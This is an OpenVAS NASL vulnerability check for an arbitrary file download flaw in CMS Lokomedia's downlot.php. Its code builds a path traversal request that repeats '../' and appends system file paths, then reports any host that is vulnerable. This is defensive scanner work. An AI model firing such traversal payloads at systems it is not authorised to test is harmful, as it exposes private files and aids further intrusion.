###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_lokomedia_46915.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# CMS Lokomedia 'downlot.php' Arbitrary File Download Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103121");
  script_version("$Revision: 7577 $");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2011-03-21 13:19:58 +0100 (Mon, 21 Mar 2011)");
  script_bugtraq_id(46915);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("CMS Lokomedia 'downlot.php' Arbitrary File Download Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/46915");
  script_xref(name:"URL", value:"http://bukulokomedia.com/home");

  tag_summary = "CMS Lokomedia is prone to a vulnerability that lets attackers download
  arbitrary files. This issue occurs because the application fails to
  sufficiently sanitize user-supplied input.";

  tag_impact = "Exploiting this issue will allow an attacker to view arbitrary files
  within the context of the application. Information harvested may aid
  in launching further attacks.";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/lokomedia", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file( keys( files ) ) {
   
    url = string(dir, "/downlot.php?file=",crap(data:"../",length:9*9),files[file]); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
